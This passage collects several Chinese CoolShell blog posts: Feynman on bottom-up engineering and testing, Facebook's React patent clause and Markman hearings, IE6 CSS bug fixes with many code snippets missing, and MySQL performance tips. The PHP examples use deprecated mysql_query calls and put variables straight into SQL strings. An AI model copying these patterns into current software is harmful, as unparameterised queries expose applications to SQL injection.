。设计要求的引擎寿命可以完成55次点火任务（相当于27,000秒的操作，也就是说，第次点火需要500秒），但事实上这并没有完成。而引擎现在则 > **需要频繁维护，并需要经常更换重要的部件** ，比如：涡轮泵，轴承，金属片，等等。
!Richard Feynman“不合适的自顶向下的设计方式，导致了问题很难去发现和修正，最终没有完成设计需求，频繁性地维护”这些描述方式，听起来是不是似曾相识？我们每天在做的软件工程和这个不一样吗？Feynman 详细说明了为什么“自顶向下”的设计会让发现和解决这些问题成为那么的难和痛苦的一件事：> 很多这些已被解决的问题在一开始设计时都是设计的难点。很自然地，没有人可以确定那些所有的已发现问题都能会出现，而其中一些， > **我们并没有根据正确的原因在正确的地方解决这些问题** 。无论这是Linux内核，或是航天飞机引擎，这些设计时的基本的问题都是相通的。而“自顶向下”是其中荒唐的一个，因为，自顶向下，过度的注重了需求而忽略了现实，而那些下面非常细节的知识绝对是非常需要的，并不是所有的东西都可以抽象成出来。在他说起航空电子系统时（一个NASA的另一个部门）：> 该软件是采用了从底向上的方法被小心地做了检查。 **首先，每一行代码都被检查过，然后，代码段和模块和一些详细的功能被验证过** > 。而检查范围在一步一步地被扩大，直到新的改变被组合进来最终成为一个完整的系统。这个过程最终的完整的输出成为了最终的产品，成为了新的release。这个部门完全以一种中立的态度， > **把软件作为一个敌对方** ，不停地测试，校验，就像自己就是这个软件的用户一样。
是的，这就是1986年Feynman告诉大家的——Unit Test（单元测试），今天，Unit Test成为了软件开发活动中最最重要的一个环节（也许你以为是Coding）。并不单单只是Unit Test，“步步为营的增量式”和“以敌对的态度”，都是值得我们所学习的。我们经常听到有人在抱怨软件道，因为软件工程还太年轻了，还有很多知识我们还没有得到，所以总是那么多问题。这完全是胡说！我们痛苦是因为，我们 总是忽略 早就确定了的， 早为人所熟知， 以经历和实践去证明一切的方法。 当然，在这方面，我们的管理层也需要负责，尤其是那些紊乱的时间进度，错误的激励机制，低档次的招聘，和一些让士气受挫的制度，等等。“管理”和“工程”间的紧张关系最终成为了糟糕的管理。Feynman在他的报告中也谈到了这点，下面其中的一小段话：> 总而言之，计算机软件检查系统和 **最负责的态度** 。是的，那里并没有那种自欺欺人而不顾固体燃料助推器的标准。但可以肯定的是，有关管理部门 > **最新的建议，建议取消此类复杂而昂贵的不必要的测试** 。这只是其中的一个小段。我把其挑出来是因为其一针见血地指出了观点，比如“最负责的态度”，以及“逐步的自欺欺人”。我建议你读一读报告全文， 可以让你得到很多真相。关于软件工程，下面是几个主要观点：
* 工程仅当在和其管理有好的关系的时候才能好。   * 大型的从上从前端的设计是愚蠢的。   * 软件工程和其它传统的工程学是一样的。   * 可靠的系统由几近残酷的测试，增量式的自底向上的工程，以及高负责的态度来共同保证。这篇报告中，还有很多不错的观点，如果你感受到了，欢迎你告诉我。（全文完）# 关于Facebook 的 React 专利许可证作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn随着Apache、百度、Wordpress都在和Facebook的React.js以及其专利许可证划清界限，似乎大家又在讨论Facebook的这个BSD+PATENT的许可证问题了。这让我想起了之前在Medium读过的一篇文章——《React, Facebook, and the Revocable Patent License, Why It’s a Paper》，我觉得那篇文章写的不错，而且还是一个会编程的律师写的，所以有必要把这篇文章传播到中文社区这边来。注意，我不会全部翻译，我只是用我的语言来负责搬运内容和观点，我只想通过这篇文章让大家了解一下这个世界以及专利相关的知识，这样可以避免你看到某乎的“怎么看待XXX”这类的问题时人云亦云，能有自己的独立思考和自我判断。;-)
这篇文章的作者叫Dennis Walsh，他自称是亚历桑那和加利福尼亚州的律师，主要针对版权法和专利诉论的法律领域。但是这个律师不一样，他更很喜欢商业和软件多一些。现在他用React/GraphQL/Elixir在写一个汽车代理销售相关的软件，而且已经发布到第2版了。首先，作者表明，专利法经常被人误解，因为其实充满了各种晦涩难懂的法律术语，所以，作者用个例子来讲述专利的一个原则 —— **专利并不是授于让你制造或开发的权利，而是授予你可以排他的权利。（** 事实上似乎也是这样，申请专利很多时候都不是为了制作相关的产品，而是为了防止别人使用类似的技术制作相关的产品）如果有公司X为铅笔申请了专利，而另一家公司Y为把用于铅笔的橡皮擦申请了专利。那么，公司X可以阻止公司Y来生产铅笔，而对带橡皮擦的铅笔没办法，但是公司Y的专利可以让公司X不能生产带有橡皮擦的铅笔。所以，公司Y的橡皮擦专利又被广泛地叫作“Blocking Patent”。公司Y不能说他发明了铅笔，因为这是公司X的专利，但是，他们可以让公司X无法对铅笔做出某些改进。于是，因为这种 Blocking Patent 存在，对于开源的公司是不利的，因为根据上面的那个例子来说，开源公司就是公司X，他们做了一个基础的软件，而公司Y在上面做了些改进，并注册成了专利，从而导致开源的公司X无法对它基础开源软件作出被公司Y专利阻止的改进，开源的公司X希望能够自由地使用公司Y的橡皮擦专利，因为毕竟是它发明了铅笔并放弃了铅笔的专利。
于是就出来了“专利反击条款”（Patent Retaliation Clauses）。一般来说有两种专利条款，一种是弱条款，一种是强条款。Weak Patent Retaliation Clauses – 这种条款声明，如果许可证持有者用某个专利来打击许可证颁布者，那么专利就视为终止。用人话来表达就是，公司X做了一个开源铅笔，而公司Y注册了橡皮檫专利。此时，公司X做了一支带像皮擦的铅笔，而公司Y马上对公司X提起专利侵权诉讼。那么，公司Y就失去了对底层铅笔的专利控制。（正如前面所说的，公司Y的橡皮擦专利因为在起诉公司X的开源铅笔，而失去了对开源铅笔的专利排他权利）Strong Patent Retailiation Clauses – 这种条款声明比“弱条款”要的更多。具体来说就是，任何专利声明终结许可证，而不管这个专利有没有和你基础的软件有关系。用人话来说就是，公司Y使用他们的热气球专利来起诉公司X，那么公司Y就失去了他们对铅笔的专利限制。我个人理解起来，这两种条款看上去是防御性质的。Facebook的React的Patent License如下：> The license granted hereunder will terminate, automatically and without > notice,if you (or any of your subsidiaries, corporate affiliates or agents) > initiatedirectly or indirectly, or take a direct financial interest in, any > Patent Assertion: (i) against Facebook or any of its subsidiaries or > corporateaffiliates, (ii) against any party if such Patent Assertion arises > in whole orin part from any software, technology, product or service of > Facebook or any ofits subsidiaries or corporate affiliates, or (iii) against > any party relating to the Software. Notwithstanding the foregoing, if > Facebook or any of itssubsidiaries or corporate affiliates files a lawsuit > alleging patentinfringement against you in the first instance, and you > respond by filing apatent infringement counterclaim in that lawsuit against > that party that isunrelated to the Software, the license granted hereunder > will not terminateunder section (i) of this paragraph due to such > counterclaim.
这些条款中和基础软件没有任何关系，所以， **这个条款是“强专利反击条款”** 。在后面，本文的作者又解解释了，为什么React的“强专利反击条款”就跟没有似的。他在文中针对一些歇斯底里的言论，如：“Facebook不用害怕专利诉讼了，而且他可以随时偷袭你家的专利仓库”，也作出了一些解释来分析这个事。Contractural Liability – 意思是说，专利方面的东西只会影响专利上的事，而不会影响和专利无关的事，React底层协议是BSD-3许可证还是会被保留。换句话说，React的“强专利反击条款”只生效于专利层面，而不会对非常专利的软件使用产生问题，如果和专利无关，React还是走BSD-3的许可协议。Copyright Liability – 这个和Contractural Liablitity 一样。作者说，如果有人有特别的案例或是有说服力的论据来说明Facebook的这个条款会作用于非专利的地方，那么，请告诉他。Patent Liability – 专利的责任和损害是两件事，非专业人士总是会把其搞混。第一个问题是Liability， 要搞清这个事，得搞清“Patent’s Claims”，而不是这个技术的技术规格说明，技术规格说明和权力主张是两码事。作者说，现在的很多专利都是一些想法，很多投机份子随便一拍脑袋就发明出一个想法，然后就去注册专利了。但是可以被用来法律执行的只有“Patent’s Claims”（专利的权利主张），而不是那些想法。这些权利主张相当相当的晦涩难读，而且是会故意被模糊掉的，因为，当你清楚的定义了你的发明是什么，那么，就可以清楚的定义出来什么不是你的发明。比如：一个铅笔专利权利主张里说，“这一个用石墨和木头组合起来的写字工具”，那么，只要我不用木头和石墨来做组合，而是用塑料来做组合，那么我就不是专利侵权。所以，一般来说，专利主张是会更为通用一些，比如，“这是一个用于涂画表面的装置，其包括：与涂画端相连的握持端”。作者这里给了一个苹果公司的滑动解锁专利的示例。可以感受一下产品规格说明和专利权利主张完全是两码事。
专利这些事，在法律界里是非常非常困难作出评估的。所以，这个社会每年都会给律师们几十亿美金来一遍又一遍地回答这些问题，而且律师还经常回答错了。而对于美国的法律，对于专利诉讼会有一个叫Markman hearing的审前听证会（马克曼听证会），自从1996年美国最高法的“马克曼诉威斯幽仪器公司案”这个听证会就变成了一个惯例，美国联邦法院用这个听证会来向决定专利权利主张的解释，而且，上诉法院还经常性的推翻审判法院的裁决。（对于美国法律来说，一般是法官认证法律，陪审团认定事实，然而，对于专利而言，1996年的那个案件认为专利术语是一个需要法官决定的法律问题，而不是陪审团决定的事实问题。关于马克曼听证会的事，可以参看本文未尾的附录）所以，要决定Facebook的专利责任，我们需要评估Facebook的专利及其权利主张，而不是技术规格说明。具体来说，要明确Facebook对于React这个底层技术的专利权利主张是什么？但是作者搜了一下，发现什么也没有找到。也就是说，对于USPTO（美国专利商标局）或法院来说，他们没办法对Facebook的这样没有为React申请专利的方式来执行任何和专利的诉讼，也就是说，Facebook的这个React License的条款，美国政府是无法在法律上支持的。
第二个问题是专利损害。就算是Facebook可以评估出来一个合法可执行的专利来保护React，对于专利损害也是很有问题的。作者说他到目前还没有发现一个开源软件被专利侵权的事，就算有这样的案例，也不会是这里说的这个事。作者觉得在这个事上操作起来就是一个笑话。另外，作者认为，React 专利许可证这个事就是个纸老虎。因为，一方面，这个专利不像电信通讯里的那些专利，你拿不掉。作者认为要从你的代码中把React去掉虽然难，但是也不是什么很难的事，另外，要打这样的专利官司，一般来说，在美国至少要花100-200万美金的费用才能发起诉讼，而要胜诉则需要需要200多万到2000万美金的费用，你觉得你要花多钱才能把React从你的代码库中剔除？肯定比这钱少。作者还认为，Facebook玩这个事虽然出发点不错，但是感觉并不聪明，从目前的情况看下来，就像他想咬你一口，但却没有牙。后面，作者还说了一下，转成别的框架会不会有问题？比如：你用Preact/Vue或是你自研的东西？作者说，未必，如果Facebook真的为React注册了专利，比如：React里的组件技术、虚拟DOM渲染技术等等。那么，你用Preact/Vue或是带这样技术的自研的框架，那么，从你使用的第一天就在侵犯Facebook的专利权了。然而，使用React反而不会有这么大的风险，因为Facebook让你免费的用React。作者说，用别的框架的法律风险比用其它替代品的风险更高。
后面，作者也更新了一篇文章 《Using GraphQL? Why Facebook Now Owns You》，意思是，用React可能还好，但是用GraphQL就有问题了。因为找到了GraphQL的专利—— “Graph Query Logic”。后来我查了一下，我发现，React也有个相关的专利—— “Efficient event delegation in browser scripts ”，看上去和虚拟DOM渲染有关。Holy Shit!好了，用还是不用React我也不知道，总之，这个世界比较复杂，我只是想借这篇文章来学习一下法律上的相关东西，欢迎听到大家的观点。最后，请允许我调侃一下来结束本文——“不用担心React的许可证问题，因为前端不是一年半就用新的框架重写一次么？”哈哈。**更新：Facebook官方于20017年9月23日在其官方blog上发贴《Relicensing React, Jest, Flow, and Immutable.js》决定取消之前的带专利的许可证。**#### 延伸阅读##### 马克曼听证会 – Markman Hearing马克曼听证会的一些背景知识，下面的文字来源于《“马克曼听证”制度的由来及启示》
与美国专利诉讼的悠长历史相比，1996年才经美国最高法院确立的“马克曼听证”（Markman Hearing，也称为Claim Construction，即权利要求书的解释）无疑是一项年轻的制度。但由于几乎所有的专利侵权诉讼中都会遇到涉案专利权利要求书的解释这一核心问题，且因“马克曼听证”结果往往清楚地预示了案件结果，经“马克曼听证”获得有利结论的一方一旦据此向法庭提起不审即判的动议，专利侵权诉讼往往可就此快速了结，因此该制度的确立成为美国专利诉讼历史上的一件大事。“马克曼听证”制度的由来“马克曼听证”制度确立之前，在专利侵权诉讼中的权利要求书解释，通常交由陪审团在对案件事实进行裁决时一并做出，且并不会在诉讼文件上单独就陪审团这一问题的判断进行记录。1991年，马克曼（Markman）先生因认为其拥有的专利号为RE33054的“干洗衣物贮存及追踪控制装置”专利权被Westview公司所侵犯，遂向宾夕法尼亚州东区联邦地方法院提起了专利侵权诉讼。该专利是用扫描的方式，将客户的衣物编号扫描后输入电脑中做分类标示，并在衣物干洗过程中追踪衣物位置，干洗完成后自动将衣物放回客户固定的存贮位置。被告的产品则是同时运用扫描器和电脑两种方式，将客户干洗衣物的资料存入电脑并显示费用、日期等相关信息。本案陪审团的裁决认为被告装置构成对原告专利权利的侵犯，但该地方法院认为系争专利与被告装置在功能实施上并不一致，遂推翻陪审团的裁决，判决被告不构成侵权。
马克曼不服，于1995年向联邦上诉法院提起上诉，但其上诉理由仅为联邦地方法院错误地解释了陪审团关于专利权利要求书解释中某个词语的涵义。联邦上诉法院在审理该案时，将案件的核心问题定为两个：一是原告对于请求项解释有无权利请求陪审团裁决;二是联邦地方法院是否正确地解释了“Inventory”一词。该院多数法官经审理后认为，权利要求书范围的解释与确定，属于法律问题而非事实问题，因而属于法院权限，而不应交由陪审团决定，且此前将此问题交由陪审团确定并不妥当。同时，由于认为原告专利与被告装置存在实质功能上的差异，联邦上诉法院亦不认为被告构成专利侵权。少数持不同意见的该院法官主要是质疑这一结论违反了美国第七宪法修正案（即所有根据美国法律进行的普通法诉讼，只要争议金额超过20美元，即有要求陪审团审判的权利）。马克曼不服，向最高法院提出上诉。1996年4月23日，美国最高法院就马克曼诉Westview器械公司案（Markman v. Westview Instruments, Inc. 517 U.S. 370 （1996））做出终审裁决，裁决认定：权利要求书的解释是联邦地区法院法官应当处理的法律问题，而不是应当由陪审团来认定的事实问题，尽管在解释权利要求书的过程中可能会包含一些对于事实问题的解释，且这样做并不违反第七修正案赋予给陪审团的权利。这一裁决标志着“马克曼听证”制度的正式确立。
“马克曼听证”制度的不足该案判决是美国专利诉讼史上的一个重大转折。“马克曼听证”成为法官专门用于解释专利权利要求的一个经常性听证程序，用以解决专利侵权诉讼的核心问题。由于该听证并非普遍适用，因此，十几年来，联邦民事诉讼规则并未正式对其有任何规定，而是给予法院绝对的自由裁量权。但是，何时可以进行“马克曼听证”?如何进行?是否有必要进行?类似问题在一定程度上困扰了审理专利侵权案件较多的法院。2001年，加州北区联邦地区法院率先制定了供本法院使用的专利审判专属规则（Patent Local Rules），其中第四部分即为权利要求书的解释程序（Claim Construction Proceddings），对“马克曼听证”的时间、流程、限制及当事人的义务均进行了规定。此后，各州纷纷效仿。目前，乔治亚州北区联邦法院、得克萨斯州东区联邦法院、得克萨斯州南区联邦法院、宾夕法尼亚州西区联邦法院等都制订了书面的“马克曼听证”程序指南。近年来，不断有新的案例在解释与细化着“马克曼听证”，如2006年的Wilson Sporting Goods Co.诉Hillerich & Bradsby Co.案，2005年的Phillips诉AWH Corp.案，2008年的Howmedica Osteonics Corp.诉Wright Medical Technology, Inc.案，这些司法实践大大拓展与丰富了“马克曼听证”使用的实体和程序规则，使之日渐成为美国专利诉讼中一个复杂、完备的司法程序。以至于竟然有人开发了模拟“马克曼听证”程序，只要你愿意，可以下载并训练，以熟悉和确保有真正的权利要求书解释时不会出现不利于自己的问题。
但是，该听证带来的问题也逐渐受到重视。有人质疑说该程序导致专利诉讼费用增加，因为“马克曼听证”通常会单独进行，且程序复杂，因此导致当事人花费大量的时间与精力，更为重要的是，由于40%至60%的联邦地区法院案件会在联邦巡回上诉法院被推翻，因此，花费巨大的“马克曼听证”似乎价值有限。同时，权利要求书的解释要求是不多不少，忠实于技术发明思想与发明事实，但由于地区法院分散，法官的相关技术知识不十分专业，将权利要求书解释这样的问题交给他们，难免会带来一些无法克服的问题。“马克曼听证”制度的启示我国民事诉讼中并无陪审团制度，案件的事实问题与法律问题均由法官审理与确定。在专利侵权诉讼中，对于案件中涉及到的技术问题可以通过专家鉴定等方式解决，但并不因此免除法官审理案件的义务，即法律问题的判断归于法官，事实的法律属性判断仍然归于法官。同时，权利要求书的解释在我国的专利侵权诉讼中并不是一个单独的程序，而是合并在案件审理过程中。因此，仅就我国的司法审判而言，“马克曼听证”制度并无直接的借鉴意义。但是，对于那些已经走出和正在走出国门的企业来说，了解与掌握这一重要的专利诉讼程序却是极其重要的。通领科技集团的积极尝试充分证明了这一点，而且随着这一程序的不断成熟，美国国际贸易法院（ITC）也开始在审理时适用“马克曼听证”制度。所以，知道“马克曼听证”意味着什么，确保所提交的用于解释权利要求的文件确实充分，学会利用“马克曼听证”，无论是对于破解美国的专利诉讼威胁，还是为未来准备有效的法律武器，无疑都非常重要。（知识产权报 作者 魏玮）
（全文完）# 9个最常见IE的Bug及其fix作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!9个最常见IE的Bug及其fixInternet Explorer – Web程序员的毒药。在IE上开发时间中有超过60%的时间是花在和IE的bug进行搏斗，让你的开发生产率严重下降。下面是一个教程，告诉你9个IE上最常见的BUG以及如何解决它们。目录* 1\. 居中布局   * 2\. 楼梯式的效果   * 3\. float元件的两倍空白   * 4\. 无法设置微型高度   * 5\. 跨出边界   * 6\. Fixing the Broken Box Model   * 7\. 设置min-height和min-width   * 8\. Float 布局错误行为 Misbehaving   * 9\. 在list项目门的空行   * 结论#### 1\. 居中布局创建一个CSS定义把一个元素放到中间的位置，可能是每一个Web开发人员都会做的事情。最简单的做法是为你的元素增加一个 _margin: auto;_ ，然而 IE 6.0 会出现很多奇怪的行为。让我们来看一个例子。
}下面是我们所期望的输出：!Tutorial Image但IE却给我们这样的输出：!Tutorial Image这应该是IE 6对margin的 _auto_ 并没有正确的设置。但幸运的是，这是很容易被修正的。**解决方法**最简单的方法是在父元件中使用 _text-align: center_ 属性，而在元件中使用 _text-align: left_ 。}#### 2\. 楼梯式的效果几乎所有的Web开发者都会使用list来创建导航条。下面是你可能会用到的代码：<ul>     <li><a href="#"></a></li>     <li><a href="#"></a></li>     <li><a href="#"></a></li>     </ul>一个符合标准的浏览器会是下面这样：!Tutorial Image但IE却是这样的：!Tutorial Image下面是两个解决方法**解决方法一**设置li元件的float属性。**解决方法二**设置 _display: inline_ 属性。#### 3\. float元件的两倍空白请看下面的代码：期望的结果是：!Tutorial Image
IE的结果是：!Tutorial Image**解决方案**和上面那个BUG的解决方案一样，设置 _display: inline_ 属性可以解决问题。#### 4\. 无法设置微型高度我们发现在IE中使用 _height: XXpx_ 这样的属性无法设置比较小的高度。下面是个例子（注意高度是2px）：期望结果： 2px的元件加1px的边框.!Tutorial ImageIE的结果：!Tutorial Image**解决方案一**这个BUG的产生原因很简单，IE不允许元件的高度小于字体的高度，所以，下面的fix是设置上字体大小。**解决方案二**但是最佳的解决方法是使用 _overflow: hidden_ 。#### 5\. 跨出边界这个BUG是很难看的。当父元件中使用了 _overflow_ 的 _auto_ 属性，并且在其里放入相关元件。你会看来里面的元件会跨出来。下面是一个示例：<div id="element"><div id="anotherelement"></div></div>期望的结果：!Tutorial ImageIE的结果：!Tutorial Image**解决方法**
设置 position: relative;属性#### 6\. Fixing the Broken Box ModelInternet Explorer曲解了“盒子模子”可能是最不可原谅的事情了。IE 6 这个半标准的浏览器回避了这个事情，但这个问题还是会因为IE运行在“怪异模式”下出现。两个Div元件。一个是有fix的，一个是没有的。而他们不同的高和宽加上padding的总合却是不一样的。下图的上方是被修正的，下方则没有。!Tutorial Image**解决方法**我相信这个事情即不需要解释也不需要演示，这应该是大多数人都明白的。下面是一个很相当怪异的解决方案上面的定义也就是说：是的，你要原来的长和宽上加上了padding。但这个fix只会作用于IE了的“怪异模式”，所以你不需要担心在IE6的正常模式下会有问题。#### 7\. 设置min-height和min-widthIE忽略了min-height。**解决方法一**这个fix由 Dustin Diaz提供。其利用了 _!important_ 下面是代码片段：**解决方法二**#### 8\. Float 布局错误行为 Misbehaving
使用无table的布局最重要的就是使用CSS的float元件。在很多情况下，IE6处理起来好像在摸索阶段，有些时候，你会发现很多奇怪的行为。比如在其中有一些文本的时候。来看一下下面这个示例：<div id="container">     <div id="element">http://net.tutsplus.com/</div>     <div id="anotherelement"></div>     </div>期望结果：!Tutorial ImageIE的结果：!Tutorial Image你可以看到其中的不同了**解决方法**要解决这个问题没有什么好的方法。只有一个方法，那就是使用 _overflow: hidden_ 。#### 9\. 在list项目门的空行先看下面的例子<ul>     <li><a href="#">Link 1</a></li>     <li><a href="#">Link 2</a></li>     <li><a href="#">Link 3</a></li>     </ul>期望结果：!Tutorial ImageIE的结果：!Tutorial Image
Fortunately, there are a plethora of fixes you could try.**解决方法一**定义height来解决**解决方法二****解决方法三**为 _li_ 加上 _display: inline_ 。#### 结论调界面是一件很难的事，调一个CSS的HTML界面是一件更难的事，在IE下调一个CSS的HTML界面是难上加难的事。文章：来源# MySQL性能优化的最佳20+条经验作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn今天，数据库的操作越来越成为整个应用的性能瓶颈了，这点对于Web应用尤其明显。关于数据库的性能，这并不只是DBA才需要担心的事，而这更是我们程序员需要去关注的事情。当我们去设计数据库表结构，对操作数据库时（尤其是查表时的SQL语句），我们都需要注意数据操作的性能。这里，我们不会讲过多的SQL语句的优化，而只是针对MySQL这一Web应用最多的数据库。希望下面的这些优化技巧对你有用。目录* 1\. 为查询缓存优化你的查询   * 2\. EXPLAIN 你的 SELECT 查询   * 3\. 当只要一行数据时使用 LIMIT 1   * 4\. 为搜索字段建索引   * 5\. 在Join表的时候使用相当类型的例，并将其索引   * 6\. 千万不要 ORDER BY RAND()   * 7\. 避免 SELECT *   * 8\. 永远为每张表设置一个ID   * 9\. 使用 ENUM 而不是 VARCHAR   * 10\. 从 PROCEDURE ANALYSE() 取得建议   * 11\. 尽可能的使用 NOT NULL   * 12\. Prepared Statements   * 13\. 无缓冲的查询   * 14\. 把IP地址存成 UNSIGNED INT   * 15\. 固定长度的表会更快   * 16\. 垂直分割   * 17\. 拆分大的 DELETE 或 INSERT 语句   * 18\. 越小的列会越快   * 19\. 选择正确的存储引擎   * 20\. 使用一个对象关系映射器（Object Relational Mapper）   * 21\. 小心“永久链接”
#### 1\. 为查询缓存优化你的查询大多数的MySQL服务器都开启了查询缓存。这是提高性最有效的方法之一，而且这是被MySQL的数据库引擎处理的。当有很多相同的查询被执行了多次的时候，这些查询结果会被放到一个缓存中，这样，后续的相同的查询就不用操作表而直接访问缓存结果了。这里最主要的问题是，对于程序员来说，这个事情是很容易被忽略的。因为，我们某些查询语句会让MySQL不使用缓存。请看下面的示例：// 查询缓存不开启     $r = mysql_query("SELECT username FROM user WHERE signup_date >= CURDATE()");// 开启查询缓存     $today = date("Y-m-d");     $r = mysql_query("SELECT username FROM user WHERE signup_date >= '$today'");上面两条SQL语句的差别就是 CURDATE() ，MySQL的查询缓存对这个函数不起作用。所以，像 NOW() 和 RAND() 或是其它的诸如此类的SQL函数都不会开启查询缓存，因为这些函数的返回是会不定的易变的。所以，你所需要的就是用一个变量来代替MySQL的函数，从而开启缓存。
#### 2\. EXPLAIN 你的 SELECT 查询使用 EXPLAIN 关键字可以让你知道MySQL是如何处理你的SQL语句的。这可以帮你分析你的查询语句或是表结构的性能瓶颈。EXPLAIN 的查询结果还会告诉你你的索引主键被如何利用的，你的数据表是如何被搜索和排序的……等等，等等。挑一个你的SELECT语句（推荐挑选那个最复杂的，有多表联接的），把关键字EXPLAIN加到前面。你可以使用phpmyadmin来做这个事。然后，你会看到一张表格。下面的这个示例中，我们忘记加上了group_id索引，并且有表联接：当我们为 group_id 字段加上索引后：我们可以看到，前一个结果显示搜索了 7883 行，而后一个只是搜索了两个表的 9 和 16 行。查看rows列可以让我们找到潜在的性能问题。#### 3\. 当只要一行数据时使用 LIMIT 1当你查询表的有些时候，你已经知道结果只会有一条结果，但因为你可能需要去fetch游标，或是你也许会去检查返回的记录数。在这种情况下，加上 LIMIT 1 可以增加性能。这样一样，MySQL数据库引擎会在找到一条数据后停止搜索，而不是继续往后查少下一条符合记录的数据。
下面的示例，只是为了找一下是否有“中国”的用户，很明显，后面的会比前面的更有效率。（请注意，第一条中是Select *，第二条是Select 1）// 没有效率的：     $r = mysql_query("SELECT * FROM user WHERE country = 'China'");     if (mysql_num_rows($r) > 0) {     // ...     }// 有效率的：     $r = mysql_query("SELECT 1 FROM user WHERE country = 'China' LIMIT 1");     if (mysql_num_rows($r) > 0) {     // ...     }#### 4\. 为搜索字段建索引索引并不一定就是给主键或是唯一的字段。如果在你的表中，有某个字段你总要会经常用来做搜索，那么，请为其建立索引吧。从上图你可以看到那个搜索字串 “last_name LIKE ‘a%'”，一个是建了索引，一个是没有索引，性能差了4倍左右。另外，你应该也需要知道什么样的搜索是不能使用正常的索引的。例如，当你需要在一篇大的文章中搜索一个词时，如： “WHERE post_content LIKE ‘%apple%'”，索引可能是没有意义的。你可能需要使用MySQL全文索引 或是自己做一个索引（比如说：搜索关键词或是Tag什么的）
#### 5\. 在Join表的时候使用相当类型的例，并将其索引如果你的应用程序有很多 JOIN 查询，你应该确认两个表中Join的字段是被建过索引的。这样，MySQL内部会启动为你优化Join的SQL语句的机制。而且，这些被用来Join的字段，应该是相同的类型的。例如：如果你要把 DECIMAL 字段和一个 INT 字段Join在一起，MySQL就无法使用它们的索引。对于那些STRING类型，还需要有相同的字符集才行。（两个表的字符集有可能不一样）// 在state中查找company     $r = mysql_query("SELECT company_name FROM users     LEFT JOIN companies ON (users.state = companies.state)     WHERE users.id = $user_id");// 两个 state 字段应该是被建过索引的，而且应该是相当的类型，相同的字符集。#### 6\. 千万不要 ORDER BY RAND()想打乱返回的数据行？随机挑一个数据？真不知道谁发明了这种用法，但很多新手很喜欢这样用。但你确不了解这样做有多么可怕的性能问题。
如果你真的想把返回的数据行打乱了，你有N种方法可以达到这个目的。这样使用只让你的数据库的性能呈指数级的下降。这里的问题是：MySQL会不得不去执行RAND()函数（很耗CPU时间），而且这是为了每一行记录去记行，然后再对其排序。就算是你用了Limit 1也无济于事（因为要排序）下面的示例是随机挑一条记录// 千万不要这样做：     $r = mysql_query("SELECT username FROM user ORDER BY RAND() LIMIT 1");// 这要会更好：     $r = mysql_query("SELECT count(*) FROM user");     $d = mysql_fetch_row($r);     $rand = mt_rand(0,$d[0] - 1);$r = mysql_query("SELECT username FROM user LIMIT $rand, 1");#### 7\. 避免 SELECT *从数据库里读出越多的数据，那么查询就会变得越慢。并且，如果你的数据库服务器和WEB服务器是两台独立的服务器的话，这还会增加网络传输的负载。
所以，你应该养成一个需要什么就取什么的好的习惯。// 不推荐     $r = mysql_query("SELECT * FROM user WHERE user_id = 1");     $d = mysql_fetch_assoc($r);     echo "Welcome {$d['username']}";// 推荐     $r = mysql_query("SELECT username FROM user WHERE user_id = 1");     $d = mysql_fetch_assoc($r);     echo "Welcome {$d['username']}";#### 8\. 永远为每张表设置一个ID我们应该为数据库里的每张表都设置一个ID做为其主键，而且最好的是一个INT型的（推荐使用UNSIGNED），并设置上自动增加的AUTO_INCREMENT标志。就算是你 users 表有一个主键叫 “email”的字段，你也别让它成为主键。使用 VARCHAR 类型来当主键会使用得性能下降。另外，在你的程序中，你应该使用表的ID来构造你的数据结构。而且，在MySQL数据引擎下，还有一些操作需要使用主键，在这些情况下，主键的性能和设置变得非常重要，比如，集群，分区……
在这里，只有一个情况是例外，那就是“关联表”的“外键”，也就是说，这个表的主键，通过若干个别的表的主键构成。我们把这个情况叫做“外键”。比如：有一个“学生表”有学生的ID，有一个“课程表”有课程ID，那么，“成绩表”就是“关联表”了，其关联了学生表和课程表，在成绩表中，学生ID和课程ID叫“外键”其共同组成主键。#### 9\. 使用 ENUM 而不是 VARCHARENUM 类型是非常快和紧凑的。在实际上，其保存的是 TINYINT，但其外表上显示为字符串。这样一来，用这个字段来做一些选项列表变得相当的完美。如果你有一个字段，比如“性别”，“国家”，“民族”，“状态”或“部门”，你知道这些字段的取值是有限而且固定的，那么，你应该使用 ENUM 而不是 VARCHAR。MySQL也有一个“建议”（见第十条）告诉你怎么去重新组织你的表结构。当你有一个 VARCHAR 字段时，这个建议会告诉你把其改成 ENUM 类型。使用 PROCEDURE ANALYSE() 你可以得到相关的建议。#### 10\. 从 PROCEDURE ANALYSE() 取得建议PROCEDURE ANALYSE() 会让 MySQL 帮你去分析你的字段和其实际的数据，并会给你一些有用的建议。只有表中有实际的数据，这些建议才会变得有用，因为要做一些大的决定是需要有数据作为基础的。
例如，如果你创建了一个 INT 字段作为你的主键，然而并没有太多的数据，那么，PROCEDURE ANALYSE()会建议你把这个字段的类型改成 MEDIUMINT 。或是你使用了一个 VARCHAR 字段，因为数据不多，你可能会得到一个让你把它改成 ENUM 的建议。这些建议，都是可能因为数据不够多，所以决策做得就不够准。在phpmyadmin里，你可以在查看表时，点击 “Propose table structure” 来查看这些建议一定要注意，这些只是建议，只有当你的表里的数据越来越多时，这些建议才会变得准确。一定要记住，你才是最终做决定的人。#### 11\. 尽可能的使用 NOT NULL除非你有一个很特别的原因去使用 NULL 值，你应该总是让你的字段保持 NOT NULL。这看起来好像有点争议，请往下看。首先，问问你自己“Empty”和“NULL”有多大的区别（如果是INT，那就是0和NULL）？如果你觉得它们之间没有什么区别，那么你就不要使用NULL。（你知道吗？在 Oracle 里，NULL 和 Empty 的字符串是一样的！)不要以为 NULL 不需要空间，其需要额外的空间，并且，在你进行比较的时候，你的程序会更复杂。 当然，这里并不是说你就不能使用NULL了，现实情况是很复杂的，依然会有些情况下，你需要使用NULL值。
下面摘自MySQL自己的文档：> “NULL columns require additional space in the row to record whether their > values are NULL. For MyISAM tables, each NULL column takes one bit extra, > rounded up to the nearest byte.”#### 12\. Prepared StatementsPrepared Statements很像存储过程，是一种运行在后台的SQL语句集合，我们可以从使用 prepared statements 获得很多好处，无论是性能问题还是安全问题。Prepared Statements 可以检查一些你绑定好的变量，这样可以保护你的程序不会受到“SQL注入式”攻击。当然，你也可以手动地检查你的这些变量，然而，手动的检查容易出问题，而且很经常会被程序员忘了。当我们使用一些framework或是ORM的时候，这样的问题会好一些。在性能方面，当一个相同的查询被使用多次的时候，这会为你带来可观的性能优势。你可以给这些Prepared Statements定义一些参数，而MySQL只会解析一次。
